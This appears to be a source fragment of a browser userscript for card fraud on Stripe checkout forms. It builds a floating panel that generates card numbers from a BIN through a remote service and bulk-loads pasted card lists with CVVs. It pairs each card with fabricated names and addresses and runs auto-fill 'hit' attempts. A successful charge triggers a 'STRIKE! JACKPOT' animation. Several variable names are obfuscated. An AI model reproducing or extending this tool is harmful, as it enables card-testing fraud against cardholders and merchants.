 <div class="cfp on" id="cfp-bin">
 <div class="cf-section-lbl">BIN INPUT</div>
 <div class="cf-bin-row">
 <input class="cf-inp cf-bin-inp" id="cf-bin-inp" placeholder="Enter BIN (6-15 digits)" maxlength="15" inputmode="numeric">
 <button class="cf-icon-btn" id="cf-bin-rnd" title="Random BIN">⚄</button>
 </div>
 <div class="cf-row" style="margin-top:6px">
 <div><div class="cf-lbl">Count</div><input class="cf-inp" id="cf-bin-count" type="number" value="10" min="1" max="99"></div>
 <div><div class="cf-lbl">Prefix</div><input class="cf-inp" id="cf-bin-pfx" value="GEN"></div>
 </div>
 <button class="cf-main-btn" id="cf-bin-gen">Generate &amp; Start</button>
 </div>
 <!-- CARD TAB -->
 <div class="cfp" id="cfp-bulk">
 <div class="cf-section-lbl">CARD LIST <span id="cf-card-count" style="color:#34d399">0 cards</span></div>
 <textarea class="cf-ta" id="cf-bulk-txt" placeholder="4111111111111111|10|26|123&#10;5500005555555559|12|25|456"></textarea>
 <button class="cf-main-btn" id="cf-bulk-imp">▶ Start</button>
 </div>
 <!-- HIT TAB -->
 <div class="cfp" id="cfp-auto">
 <div class="cf-hit-info">
 <div class="cf-hit-row">
 <span>Cards loaded</span><span id="cf-ap-cnt">0</span>
 </div>
 <div class="cf-hit-row">
 <span>Max cards</span>
 <input class="cf-inp cf-inp-sm" id="cf-max" type="number" value="15" min="1" max="99">
 </div>
 </div>
 <div class="cf-prog-wrap"><div class="cf-prog-bar" id="cf-prog"></div></div>
 <div class="cf-prog-txt" id="cf-prog-txt">0 / 0</div>
 <div class="cf-ap-stat idle" id="cf-ap-stat">Ready</div>
 <button class="cf-main-btn" id="cf-ap-start">▶ Start</button>
 <button class="cf-stop-btn" id="cf-ap-stop">⏹ Stop</button>
 <!-- LOGS collapsible -->
 <div id="cf-log-hdr" class="cf-log-toggle">
 <span>Logs</span><span id="cf-log-arr">▼</span>
 </div>
 <div class="cf-log" id="cf-log" style="display:none"></div>
 </div>
</div>`;
 document.body.appendChild(root);
 bindWidget();
 loadCards().then(()=>{scanForm();updateFab();});
 setInterval(scanForm,3000);
}
function bindWidget(){
 document.getElementById('cf-fab').addEventListener('click',()=>{
 const p=document.getElementById('cf-panel');
 p.classList.toggle('cf-open');
 if(p.classList.contains('cf-open'))scanForm();
 });
 document.getElementById('cf-collapse').addEventListener('click',()=>{
 document.getElementById('cf-panel').classList.remove('cf-open');
 });
 document.querySelectorAll('.cft').forEach(t=>{
 t.addEventListener('click',()=>{
 document.querySelectorAll('.cft').forEach(x=>x.classList.remove('on'));
 document.querySelectorAll('.cfp').forEach(x=>x.classList.remove('on'));
 t.classList.add('on');
 const pane=document.getElementById('cfp-'+t.dataset.tab);
 if(pane)pane.classList.add('on');
 });
 });
 document.getElementById('cf-bin-rnd').addEventListener('click',()=>{
 const bins=['411111','424242','453978','476173','541333','545454','552150','374251','378282','371449'];
 document.getElementById('cf-bin-inp').value=bins[Math.floor(Math.random()*bins.length)];
 });
 document.getElementById('cf-log-hdr').addEventListener('click',()=>{
 const log=document.getElementById('cf-log');
 const arr=document.getElementById('cf-log-arr');
 const hidden=log.style.display==='none';
 log.style.display=hidden?'block':'none';
 arr.textContent=hidden?'▲':'▼';
 });
 document.getElementById('cf-ap-start').addEventListener('click',startAP);
 document.getElementById('cf-ap-stop').addEventListener('click',stopAP);
 document.getElementById('cf-bulk-imp').addEventListener('click',bulkImport);
 document.getElementById('cf-bin-gen').addEventListener('click',()=>{
 binGenerate();
 });
}
let _0x36911kl40;
function toast(type,msg){
 const el=document.getElementById('cf-toast');
 el.textContent=msg;
 el.className=type+' show';
 clearTimeout(_0x36911kl40);
 _0x36911kl40=setTimeout(()=>el.className='',3000);
}
function scanForm(){
 const el=document.getElementById('cf-detect');
 if(!el)return;
 if(hasForm()){
 el.textContent='Stripe ✓';el.className='found';
 if(!_0x140fscjha)applyMasks();
 } else {
 el.textContent='No form';el.className='nf';
 }
}
function renderCards(){
 const cntEl=document.getElementById('cf-ap-cnt');if(cntEl)cntEl.textContent=cards.length;
 updateFab();
 const wrap=document.getElementById('cf-card-list');
 if(!wrap)return;
 if(!cards.length){wrap.innerHTML='<div class="cf-empty">No cards yet.<br>Add via Bulk tab ↑</div>';return;}
 wrap.innerHTML=cards.map(c=>{
 const masked=c.num.replace(/\d(?=\d{4})/g,'•').replace(/(.{4})/g,'$1 ').trim();
 const tc=c.type==='VISA'?'cf-v':c.type==='MC'?'cf-m':'cf-a';
 const _0xa138jonzw=c.result==='success'?'cf-ok':c.result?'cf-fail':'';
 const _0xa38ero2tk=c.reason?`<div class="cf-ci-reason ${c.result==='success'?'ok':'fail'}">${c.reason}</div>`:'';
 return`<div class="cf-ci ${_0xa138jonzw}" id="cfc-${c.id}">
 <div class="cf-ci-top">
 <span class="cf-ci-lbl">${c.label}</span>
 <div style="display:flex;align-items:center;gap:4px;">
 <span class="cf-badge ${tc}">${c.type}</span>
 <div class="cf-ci-btns">
 <button class="cf-ib go" data-action="fill" data-id="${c.id}" title="Fill now">⚡</button>
 <button class="cf-ib rm" data-action="del" data-id="${c.id}" title="Delete">✕</button>
 </div>
 </div>
 </div>
 <div class="cf-ci-num">${masked}</div>
 <div class="cf-ci-meta"><span>📅 ${c.expiry}</span><span>👤 ${c.name||'—'}</span><span>📍 ${c.city||'—'}</span></div>
 ${_0xa38ero2tk}
 </div>`;
 }).join('');
}
function updateFab(){
 const cnt=document.getElementById('cf-fab-cnt');
 if(!cnt)return;
 if(cards.length>0){cnt.textContent=cards.length;cnt.style.display='flex';}
 else cnt.style.display='none';
}
async function bulkImport(){
 const raw=document.getElementById('cf-bulk-txt').value.trim();
 const _pfxEl=document.getElementById('cf-bulk-pfx');const pfx=_pfxEl?_pfxEl.value.trim()||'VCC':'VCC';
 if(!raw){toast('warn','Paste kartu dulu');return;}
 if(_0xba346ejgx.length < 5) await prefetchAddrs(true);
 cards=[];
 let added=0,skip=0;
 raw.split('\n').forEach(line=>{
 const c=parseLine(line);
 if(!c){skip++;return;}
 if(cards.find(x=>x.num===c.num)){skip++;return;}
 const addr=genAddr();
 c.label=`${pfx} #${cards.length+1}`;
 c.name=addr.name||genName();
 c.address=addr.address;c.city=addr.city;c.state=addr.state||'';c.zip=addr.zip;c.country=addr.country||'US';
 cards.push(c);added++;
 });
 saveCards();updateFab();
 const cntEl=document.getElementById('cf-ap-cnt');if(cntEl)cntEl.textContent=cards.length;
 if(added){
 toast('ok',`✅ ${added} kartu dimuat`);
 document.getElementById('cf-bulk-txt').value='';
 document.querySelectorAll('.cft').forEach(x=>x.classList.remove('on'));
 document.querySelectorAll('.cfp').forEach(x=>x.classList.remove('on'));
 document.querySelectorAll('.cft').forEach(x=>x.classList.remove('on'));
 document.querySelectorAll('.cfp').forEach(x=>x.classList.remove('on'));
 document.querySelector('[data-tab="auto"]').classList.add('on');
 document.getElementById('cfp-auto').classList.add('on');
 startAP();
 } else toast('warn','No cards valid');
}
async function binGenerate() {
 const bin = document.getElementById('cf-bin-inp').value.trim().replace(/[^0-9]/g,'');
 if (bin.length < 6) { toast('warn','Minimal 6 digit BIN'); return; }
 const count = parseInt(document.getElementById('cf-bin-count').value) || 10;
 const pfx = document.getElementById('cf-bin-pfx').value.trim() || 'GEN';
 if (_0xba346ejgx.length < count) await prefetchAddrs(true);
 toast('info', '⏳ Generating...');
 try {
 const hdrs = await getHeaders();
 const res = await fetch(`${API_BASE}/api/public/gen-cards`, {
 method:'POST', headers:hdrs,
 body: JSON.stringify({bin, count})
 });
 const data = await res.json();
 if (!data.ok) { toast('err','❌ ' + (data.error||'Failed')); return; }
 cards = [];
 data.cards.forEach((c,i) => {
 cards.push({
 id: Date.now()+i, num:c.num, expiry:c.expiry, cvv:c.cvv,
 type:c.type, label:`${pfx} #${i+1}`, name:c.name,
 address:c.address, city:c.city, state:c.state||'', zip:c.zip, country:c.country||'US',
 });
 });
 saveCards(); updateFab();
 toast('ok', `✅ ${cards.length} cards from BIN ${bin}`);
 document.querySelectorAll('.cft').forEach(x=>x.classList.remove('on'));
 document.querySelectorAll('.cfp').forEach(x=>x.classList.remove('on'));
 document.querySelector('[data-tab="auto"]').classList.add('on');
 document.getElementById('cfp-auto').classList.add('on');
 renderCards();
 } catch(e) { toast('err','❌ ' + (e.message||'Server error')); }
}
function _zsToastStyle(){
 if(document.getElementById('zs-toast-style'))return;
 const s=document.createElement('style');
 s.id='zs-toast-style';
 s.textContent=`
 @keyframes zsSlide{0%{opacity:0;transform:translateX(28px)}55%{opacity:1;transform:translateX(-3px)}100%{opacity:1;transform:translateX(0)}}
 @keyframes zsOut{to{opacity:0;transform:translateX(28px)}}
 @keyframes zsShimmer{0%{transform:translateX(-100%)}100%{transform:translateX(220%)}}
 @keyframes zsAccent{0%{transform:scaleY(0);transform-origin:top}55%{transform:scaleY(1);transform-origin:top}}
 @keyframes zsDot{0%,100%{opacity:.45}50%{opacity:1}}
 @keyframes zsLifeBar{from{transform:scaleY(1)}to{transform:scaleY(0)}}
 @keyframes zsBoltDraw{0%{stroke-dashoffset:48;opacity:0}30%{opacity:1}100%{stroke-dashoffset:0;opacity:1}}
 .zs-card{
  position:fixed!important;top:24px!important;right:24px!important;
  z-index:2147483647!important;width:340px!important;max-width:calc(100vw - 32px)!important;
  font-family:-apple-system,BlinkMacSystemFont,'Inter','Segoe UI',sans-serif!important;
  color:#e2e8f0!important;cursor:pointer!important;user-select:none!important;
  background:linear-gradient(180deg,rgba(15,23,42,.96),rgba(11,18,32,.96))!important;
  border:1px solid rgba(148,163,184,.14)!important;border-radius:12px!important;
  box-shadow:0 20px 48px rgba(0,0,0,.55),0 0 0 1px rgba(255,255,255,.025) inset,0 0 32px var(--zs-glow,rgba(56,189,248,.10))!important;
  overflow:hidden!important;backdrop-filter:blur(18px) saturate(160%)!important;-webkit-backdrop-filter:blur(18px) saturate(160%)!important;
  animation:zsSlide .48s cubic-bezier(.2,.9,.3,1.2) both!important;
 }
 .zs-card.out{animation:zsOut .22s ease forwards!important;}
 .zs-card .zs-shim{position:absolute!important;top:0!important;left:0!important;right:0!important;height:1px!important;overflow:hidden!important;pointer-events:none!important;}
 .zs-card .zs-shim::before{content:''!important;position:absolute!important;top:0!important;left:0!important;width:45%!important;height:100%!important;background:linear-gradient(90deg,transparent,var(--zs-acc,#38bdf8),transparent)!important;animation:zsShimmer 2.4s linear infinite!important;}
 .zs-card .zs-acc{position:absolute!important;top:8px!important;bottom:8px!important;left:0!important;width:2.5px!important;border-radius:0 2px 2px 0!important;background:var(--zs-acc,#38bdf8)!important;box-shadow:0 0 8px var(--zs-acc,#38bdf8)!important;animation:zsAccent .55s cubic-bezier(.4,0,.2,1) both!important;}
 .zs-card .zs-life{position:absolute!important;top:8px!important;bottom:8px!important;right:0!important;width:2px!important;background:var(--zs-acc,#38bdf8)!important;opacity:.35!important;transform-origin:top!important;animation:zsLifeBar var(--zs-life,5000ms) linear forwards!important;}
 .zs-card .zs-row{display:flex!important;align-items:center!important;padding:10px 14px 0 14px!important;gap:8px!important;}
 .zs-card .zs-bolt{width:14px!important;height:14px!important;flex-shrink:0!important;}
 .zs-card .zs-bolt path{stroke:var(--zs-acc,#38bdf8)!important;stroke-width:1.6!important;fill:none!important;stroke-linecap:round!important;stroke-linejoin:round!important;stroke-dasharray:48!important;animation:zsBoltDraw .6s .1s ease forwards!important;}
 .zs-card .zs-wm{font-family:ui-monospace,SFMono-Regular,Menlo,monospace!important;font-size:9.5px!important;letter-spacing:2.4px!important;font-weight:600!important;color:#94a3b8!important;text-transform:uppercase!important;flex:1!important;}
 .zs-card .zs-st{display:flex!important;align-items:center!important;gap:5px!important;font-family:ui-monospace,SFMono-Regular,Menlo,monospace!important;font-size:9px!important;letter-spacing:1.4px!important;font-weight:700!important;color:var(--zs-acc,#38bdf8)!important;text-transform:uppercase!important;}
 .zs-card .zs-st .zs-d{width:6px!important;height:6px!important;border-radius:50%!important;background:var(--zs-acc,#38bdf8)!important;box-shadow:0 0 6px var(--zs-acc,#38bdf8)!important;animation:zsDot 1.4s ease-in-out infinite!important;}
 .zs-card .zs-ti{padding:6px 14px 2px 14px!important;font-size:15px!important;font-weight:600!important;color:#f1f5f9!important;letter-spacing:-.2px!important;line-height:1.25!important;}
 .zs-card .zs-meta{padding:0 14px 12px 14px!important;font-family:ui-monospace,SFMono-Regular,Menlo,monospace!important;font-size:10.5px!important;color:#64748b!important;letter-spacing:.3px!important;line-height:1.5!important;display:flex!important;flex-wrap:wrap!important;gap:0 8px!important;}
 .zs-card .zs-meta b{color:#94a3b8!important;font-weight:500!important;}
 .zs-card .zs-meta span{display:inline-flex!important;align-items:center!important;gap:4px!important;}
 .zs-card .zs-meta span+span::before{content:'·'!important;color:#334155!important;margin-right:8px!important;}
 .zs-card.zs-success{--zs-acc:#22d3ee;--zs-glow:rgba(34,211,238,.18);}
 .zs-card.zs-success .zs-ti{background:linear-gradient(92deg,#fde047 0%,#fbbf24 45%,#fde047 90%)!important;-webkit-background-clip:text!important;background-clip:text!important;-webkit-text-fill-color:transparent!important;color:transparent!important;text-shadow:0 0 18px rgba(251,191,36,.35)!important;font-weight:700!important;letter-spacing:.4px!important;}
 .zs-card.zs-declined{--zs-acc:#f87171;--zs-glow:rgba(248,113,113,.14);}
 .zs-card.zs-threeds{--zs-acc:#fbbf24;--zs-glow:rgba(251,191,36,.14);}
 @media (max-width:700px),(pointer:coarse){.zs-card{top:14px!important;right:10px!important;width:300px!important;}.zs-card .zs-ti{font-size:14px!important;}}

 @keyframes zsRing{0%{opacity:.55;transform:translate(-50%,-50%) scale(.25)}80%{opacity:.08}100%{opacity:0;transform:translate(-50%,-50%) scale(2.6)}}
 @keyframes zsBolt{0%{opacity:0;transform:translate(0,0) rotate(0) scale(.4)}12%{opacity:1}100%{opacity:0;transform:translate(var(--dx),var(--dy)) rotate(var(--dr)) scale(1)}}
 @keyframes zsRise{0%{opacity:0;transform:translate(var(--ox),0) scale(.6) rotate(var(--rr1))}18%{opacity:1}100%{opacity:0;transform:translate(calc(var(--ox) + var(--rx)),var(--ry)) scale(1.1) rotate(var(--rr2))}}
 @keyframes zsStrikeIn{0%{opacity:0;transform:translateX(-50%) scaleY(0);transform-origin:top}10%{opacity:1}30%{opacity:1;transform:translateX(-50%) scaleY(1)}55%{opacity:.95}100%{opacity:0;transform:translateX(-50%) scaleY(1)}}
 @keyframes zsFlash{0%{opacity:0}10%{opacity:.55}25%{opacity:.1}40%{opacity:.4}100%{opacity:0}}
 @keyframes zsArc{0%,100%{opacity:.35;filter:drop-shadow(0 0 4px var(--zs-acc,#22d3ee))}50%{opacity:1;filter:drop-shadow(0 0 12px var(--zs-acc,#22d3ee))}}
 @keyframes zsFlake{0%{opacity:0;transform:translate(0,-30px) rotate(var(--rs,0deg)) scale(.4)}15%{opacity:1;transform:translate(0,0) rotate(calc(var(--rs,0deg) + 20deg)) scale(1.05)}70%{opacity:.85}100%{opacity:0;transform:translate(0,var(--ddy,80px)) rotate(var(--re,180deg)) scale(.7)}}
 @keyframes zsBanner{0%{opacity:0;transform:translate(-50%,-50%) scale(.3) rotate(-6deg);filter:blur(8px)}18%{opacity:1;transform:translate(-50%,-50%) scale(1.18) rotate(2deg);filter:blur(0)}28%{transform:translate(-50%,-50%) scale(1) rotate(0)}70%{opacity:1;transform:translate(-50%,-50%) scale(1) rotate(0)}100%{opacity:0;transform:translate(-50%,-50%) scale(1.4) rotate(0);filter:blur(4px)}}
 @keyframes zsBannerGlow{0%,100%{text-shadow:0 0 18px #fde047,0 0 36px rgba(251,191,36,.6),0 0 60px rgba(34,211,238,.45),0 4px 0 #b45309}50%{text-shadow:0 0 28px #fef3c7,0 0 56px rgba(252,211,77,.85),0 0 90px rgba(103,232,249,.7),0 4px 0 #b45309}}
 @keyframes zsBottomIn{0%{opacity:0;transform:translateY(120%) scale(.92)}60%{opacity:1;transform:translateY(-6%) scale(1.02)}100%{opacity:1;transform:translateY(0) scale(1)}}
 @keyframes zsBottomOut{to{opacity:0;transform:translateY(120%) scale(.92)}}
 @keyframes zsBottomLife{from{transform:scaleX(1)}to{transform:scaleX(0)}}
 @keyframes zsBottomPulse{0%,100%{box-shadow:0 14px 40px rgba(0,0,0,.55),0 0 0 1px rgba(34,211,238,.3),0 0 24px rgba(34,211,238,.2)}50%{box-shadow:0 14px 50px rgba(0,0,0,.6),0 0 0 1px rgba(103,232,249,.55),0 0 36px rgba(34,211,238,.45)}}
 @keyframes zsEmojiRise{0%{opacity:0;transform:translate(0,0) rotate(0) scale(.4)}15%{opacity:1;transform:translate(calc(var(--exr,0px)*.3),calc(var(--eyr,-200px)*.2)) rotate(calc(var(--err,0deg)*.2)) scale(1.1)}80%{opacity:1}100%{opacity:0;transform:translate(var(--exr,0px),var(--eyr,-400px)) rotate(var(--err,0deg)) scale(.85)}}
 .zs-fx{position:fixed!important;z-index:2147483646!important;pointer-events:none!important;}
 .zs-fx-stage{overflow:hidden!important;}
 .zs-fx-flake{position:absolute!important;animation:zsFlake 1.6s cubic-bezier(.2,.6,.3,1) forwards!important;filter:drop-shadow(0 0 6px var(--bc,#22d3ee)) drop-shadow(0 0 12px rgba(34,211,238,.5))!important;will-change:transform,opacity!important;}
 .zs-fx-flake path{fill:var(--bc,#22d3ee)!important;}
 .zs-fx-banner{position:fixed!important;top:42%!important;left:50%!important;z-index:2147483647!important;pointer-events:none!important;font:900 64px/.95 'Space Grotesk',-apple-system,BlinkMacSystemFont,sans-serif!important;letter-spacing:.04em!important;text-align:center!important;background:linear-gradient(180deg,#fef9c3 0%,#fde047 35%,#fbbf24 70%,#f59e0b 100%)!important;-webkit-background-clip:text!important;background-clip:text!important;-webkit-text-fill-color:transparent!important;color:transparent!important;animation:zsBanner 3.4s cubic-bezier(.2,.7,.3,1) forwards, zsBannerGlow 1.4s ease-in-out infinite!important;will-change:transform,opacity!important;}
 .zs-fx-banner .zs-bnr-sub{display:block!important;margin-top:8px!important;font:700 13px/1 'JetBrains Mono',ui-monospace,monospace!important;letter-spacing:.6em!important;color:#67e8f9!important;-webkit-text-fill-color:#67e8f9!important;text-shadow:0 0 12px rgba(34,211,238,.8),0 0 24px rgba(34,211,238,.5)!important;background:none!important;}
 @media (max-width:700px),(pointer:coarse){.zs-fx-banner{font-size:46px!important;top:38%!important;}.zs-fx-banner .zs-bnr-sub{font-size:11px!important;letter-spacing:.5em!important;}}
 .zs-bot{position:fixed!important;left:14px!important;bottom:14px!important;z-index:2147483646!important;width:340px!important;max-width:calc(100vw - 28px)!important;background:linear-gradient(135deg,#0a0f1c 0%,#0d1726 60%,#0a1320 100%)!important;border:1px solid rgba(34,211,238,.3)!important;border-radius:16px!important;padding:13px 14px 14px 14px!important;color:#e2e8f0!important;font-family:'Space Grotesk',-apple-system,BlinkMacSystemFont,sans-serif!important;box-shadow:0 14px 40px rgba(0,0,0,.55),0 0 0 1px rgba(34,211,238,.3),0 0 24px rgba(34,211,238,.2)!important;animation:zsBottomIn .55s cubic-bezier(.2,.7,.3,1.2) both, zsBottomPulse 2s ease-in-out 1s infinite!important;display:flex!important;align-items:center!important;gap:11px!important;overflow:hidden!important;cursor:pointer!important;}
 .zs-bot.out{animation:zsBottomOut .35s cubic-bezier(.4,0,1,1) forwards!important;}
 .zs-bot::before{content:''!important;position:absolute!important;inset:0!important;background:radial-gradient(circle at 0 100%,rgba(34,211,238,.12),transparent 50%)!important;pointer-events:none!important;}
 .zs-bot-ic{flex-shrink:0!important;width:38px!important;height:38px!important;border-radius:11px!important;background:linear-gradient(135deg,#0891b2,#22d3ee)!important;display:flex!important;align-items:center!important;justify-content:center!important;box-shadow:0 6px 18px rgba(34,211,238,.4),inset 0 1px 0 rgba(255,255,255,.2)!important;position:relative!important;z-index:1!important;}
 .zs-bot-ic svg{width:20px!important;height:20px!important;}
 .zs-bot-ic svg path{fill:#0a0f1c!important;}
 .zs-bot-mid{flex:1!important;min-width:0!important;position:relative!important;z-index:1!important;}
 .zs-bot-tag{display:inline-block!important;font:700 9.5px/1 'JetBrains Mono',ui-monospace,monospace!important;letter-spacing:.18em!important;padding:3px 7px!important;border-radius:4px!important;background:rgba(34,211,238,.15)!important;color:#67e8f9!important;border:1px solid rgba(34,211,238,.35)!important;margin-bottom:5px!important;}
 .zs-bot-ti{font-size:13.5px!important;font-weight:700!important;color:#fff!important;line-height:1.25!important;letter-spacing:.01em!important;}
 .zs-bot-ti b{color:#fde047!important;font-weight:800!important;}
 .zs-bot-life{position:absolute!important;left:0!important;right:0!important;bottom:0!important;height:3px!important;background:linear-gradient(90deg,#22d3ee,#67e8f9,#a5f3fc)!important;transform-origin:left!important;animation:zsBottomLife var(--zs-bot-life,8s) linear forwards!important;border-radius:0 0 16px 16px!important;box-shadow:0 0 8px rgba(34,211,238,.6)!important;}
 .zs-fx-flash{position:fixed!important;inset:0!important;background:radial-gradient(circle at top right,rgba(165,243,252,.5),rgba(56,189,248,.18) 40%,transparent 70%)!important;z-index:2147483645!important;pointer-events:none!important;mix-blend-mode:screen!important;animation:zsFlash .55s ease-out forwards!important;}
 .zs-fx-strike{position:fixed!important;top:0!important;width:42px!important;height:140px!important;z-index:2147483645!important;pointer-events:none!important;animation:zsStrikeIn .42s cubic-bezier(.5,0,.7,.3) forwards!important;filter:drop-shadow(0 0 12px #67e8f9) drop-shadow(0 0 24px rgba(34,211,238,.7))!important;}
 .zs-fx-strike path{fill:url(#zsStrikeGrad)!important;}
 .zs-fx-ring{position:absolute!important;left:50%!important;top:50%!important;width:120px!important;height:120px!important;border-radius:50%!important;border:1.5px solid rgba(34,211,238,.55)!important;box-shadow:0 0 24px rgba(34,211,238,.45)!important;animation:zsRing 1.2s cubic-bezier(.2,.7,.3,1) forwards!important;}
 .zs-fx-ring.r2{animation-delay:.22s!important;border-color:rgba(165,243,252,.5)!important;box-shadow:0 0 22px rgba(103,232,249,.45)!important;}
 .zs-fx-bolt{position:absolute!important;left:50%!important;top:50%!important;width:10px!important;height:14px!important;margin:-7px 0 0 -5px!important;animation:zsBolt 1.05s cubic-bezier(.18,.7,.25,1) forwards!important;filter:drop-shadow(0 0 5px var(--bc,#22d3ee))!important;}
 .zs-fx-bolt path{fill:var(--bc,#22d3ee)!important;}
 .zs-fx-spark{position:absolute!important;left:50%!important;top:60%!important;font:700 14px -apple-system,BlinkMacSystemFont,sans-serif!important;text-shadow:0 0 8px rgba(103,232,249,.9),0 0 16px rgba(34,211,238,.5)!important;animation:zsRise 1.5s cubic-bezier(.2,.5,.3,1) forwards!important;will-change:transform,opacity!important;}
 .zs-card.zs-success .zs-acc{animation:zsAccent .55s cubic-bezier(.4,0,.2,1) both, zsArc 1.4s ease-in-out .6s 2!important;}
 `;
 document.head.appendChild(s);
}
function _zsCelebrate(){
 const isMobile=window.matchMedia&&(window.matchMedia('(max-width:700px)').matches||window.matchMedia('(pointer:coarse)').matches);
 const vw=window.innerWidth||document.documentElement.clientWidth||360;
 const vh=window.innerHeight||document.documentElement.clientHeight||640;
 const cardRight=isMobile?10:24;
 const cardW=isMobile?300:340;
 const flash=document.createElement('div');flash.className='zs-fx-flash';
 document.body.appendChild(flash);
 setTimeout(()=>flash.remove(),700);
 const strike=document.createElement('div');
 strike.className='zs-fx-strike';
 strike.style.right=(cardRight + cardW/2 - 21)+'px';
 strike.innerHTML='<svg viewBox="0 0 42 140" width="42" height="140"><defs><linearGradient id="zsStrikeGrad" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#fef9c3" stop-opacity="1"/><stop offset="35%" stop-color="#fde047" stop-opacity=".95"/><stop offset="100%" stop-color="#22d3ee" stop-opacity=".7"/></linearGradient></defs><path d="M24 0 L8 56 L20 56 L4 110 L26 60 L14 60 L30 0 Z M22 80 L34 64 L28 88 L40 70 L30 100 L36 92"/></svg>';
 document.body.appendChild(strike);
 setTimeout(()=>strike.remove(),650);
 const banner=document.createElement('div');
 banner.className='zs-fx-banner';
 banner.innerHTML='STRIKE!<span class="zs-bnr-sub">JACKPOT</span>';
 document.body.appendChild(banner);
 setTimeout(()=>banner.remove(),3500);
 const stage=document.createElement('div');
 stage.className='zs-fx zs-fx-stage';
 stage.style.cssText='top:0!important;left:0!important;width:100vw!important;height:100vh!important;';
 document.body.appendChild(stage);
 const cyan=['#22d3ee','#67e8f9','#38bdf8','#a5f3fc','#cffafe','#7dd3fc'];
 const gold=['#fde047','#fbbf24','#f59e0b','#fef08a','#facc15','#fcd34d'];
 const palette=cyan.concat(gold);
 const sparkSvg='<svg viewBox="0 0 10 14" width="100%" height="100%"><path d="M6 0 L1 8 L4.5 8 L3.5 14 L9 6 L5.5 6 Z"/></svg>';
 function spawnWave(count,wave){
  for(let i=0;i<count;i++){
   const b=document.createElement('div');b.className='zs-fx-flake';
   const sz=11+Math.random()*22;
   const x=Math.random()*vw;
   const y=Math.random()*vh;
   const rotS=(Math.random()*120-60).toFixed(0);
   const rotE=(Math.random()*720-360).toFixed(0);
   const dy=(50+Math.random()*140).toFixed(0);
   b.style.left=x.toFixed(0)+'px';
   b.style.top=y.toFixed(0)+'px';
   b.style.width=sz.toFixed(0)+'px';
   b.style.height=(sz*1.4).toFixed(0)+'px';
   b.style.setProperty('--rs',rotS+'deg');
   b.style.setProperty('--re',rotE+'deg');
   b.style.setProperty('--ddy',dy+'px');
   b.style.setProperty('--bc',palette[(i+wave*7)%palette.length]);
   b.style.animationDelay=(Math.random()*0.4).toFixed(2)+'s';
   b.style.animationDuration=(1.4+Math.random()*0.8).toFixed(2)+'s';
   b.innerHTML=sparkSvg;
   stage.appendChild(b);
  }
 }
 const sizes=isMobile?[18,16,14]:[26,22,18];
 spawnWave(sizes[0],0);
 setTimeout(()=>spawnWave(sizes[1],1),650);
 setTimeout(()=>spawnWave(sizes[2],2),1500);
 const emojis=['💎','⭐','✨','💰','🏆'];
 const emojiCount=isMobile?7:11;
 for(let i=0;i<emojiCount;i++){
  const e=document.createElement('div');
  e.style.cssText='position:absolute!important;left:'+Math.random()*vw+'px!important;top:'+(vh-40)+'px!important;font-size:'+(20+Math.random()*14).toFixed(0)+'px!important;opacity:0!important;pointer-events:none!important;will-change:transform,opacity!important;text-shadow:0 0 10px rgba(253,224,71,.7),0 0 20px rgba(34,211,238,.4)!important;animation:zsEmojiRise '+(2.2+Math.random()*1).toFixed(2)+'s cubic-bezier(.2,.6,.3,1) '+(Math.random()*0.8).toFixed(2)+'s forwards!important;';
  e.style.setProperty('--exr',(Math.random()*120-60).toFixed(0)+'px');
  e.style.setProperty('--eyr',(-(vh*0.7+Math.random()*120)).toFixed(0)+'px');
  e.style.setProperty('--err',(Math.random()*720-360).toFixed(0)+'deg');
  e.textContent=emojis[i%emojis.length];
  stage.appendChild(e);
 }
 const r1=document.createElement('div');r1.className='zs-fx-ring';
 r1.style.cssText='left:'+(vw-cardRight-cardW/2)+'px!important;top:'+(isMobile?60:70)+'px!important;';
 const r2=document.createElement('div');r2.className='zs-fx-ring r2';
 r2.style.cssText=r1.style.cssText;
 const r3=document.createElement('div');r3.className='zs-fx-ring';
 r3.style.cssText='left:'+(vw/2)+'px!important;top:'+(vh*0.42)+'px!important;border-color:rgba(253,224,71,.5)!important;box-shadow:0 0 30px rgba(251,191,36,.5)!important;animation-duration:1.6s!important;animation-delay:.1s!important;';
 stage.appendChild(r1);stage.appendChild(r2);stage.appendChild(r3);
 setTimeout(()=>stage.remove(),4200);
}
function _zsCongratsBottom(meta){
 document.querySelectorAll('.zs-bot').forEach(el=>el.remove());
 const life=8000;
 const b=document.createElement('div');
 b.className='zs-bot';
 b.style.setProperty('--zs-bot-life',life+'ms');
 const detail=meta&&meta.length?'<div style="margin-top:3px;font-size:11px;color:#94a3b8;font-family:JetBrains Mono,ui-monospace,monospace;letter-spacing:.04em">'+meta.join(' · ')+'</div>':'';
 b.innerHTML=
  '<div class="zs-bot-ic"><svg viewBox="0 0 24 24"><path d="M13 2 L4 14 L11 14 L9 22 L20 10 L13 10 L15 2 Z"/></svg></div>'+
  '<div class="zs-bot-mid">'+
   '<span class="zs-bot-tag">STRIKE</span>'+
   '<div class="zs-bot-ti"><b>Congratulations</b> — Strike landed successfully!</div>'+
   detail+
  '</div>'+
  '<div class="zs-bot-life"></div>';
 const close=()=>{b.classList.add('out');setTimeout(()=>b.remove(),360);};
 b.addEventListener('click',close);
 document.body.appendChild(b);
 setTimeout(close,life);
}
function showZsToast(opts){
 _zsToastStyle();
 const variant=opts.variant||'success';
 const status=opts.status||(variant==='success'?'STRIKE LANDED':variant==='declined'?'REJECTED':'CHALLENGE');
 const title=opts.title||(variant==='success'?'STRIKE! ⚡⚡⚡':variant==='declined'?'Payment rejected':'3-D Secure challenge');
 const meta=opts.meta||[];
 const life=opts.life||5500;
 document.querySelectorAll('.zs-card').forEach(el=>el.remove());
 document.querySelectorAll('.zs-fx,.zs-fx-flash,.zs-fx-strike').forEach(el=>el.remove());
 const c=document.createElement('div');
 c.className='zs-card zs-'+variant;
 c.style.setProperty('--zs-life',life+'ms');
 const metaHtml=meta.length
  ?'<div class="zs-meta">'+meta.map(m=>'<span>'+m+'</span>').join('')+'</div>'
  :'';
 c.innerHTML=
  '<div class="zs-shim"></div>'+
  '<div class="zs-acc"></div>'+
  '<div class="zs-life"></div>'+
  '<div class="zs-row">'+
   '<svg class="zs-bolt" viewBox="0 0 14 14"><path d="M8 1 L3 8 L6.5 8 L5.5 13 L11 5.5 L7.5 5.5 Z"/></svg>'+
   '<div class="zs-wm">ZS / strike</div>'+
   '<div class="zs-st"><span class="zs-d"></span>'+status+'</div>'+
  '</div>'+
  '<div class="zs-ti">'+title+'</div>'+
  metaHtml;
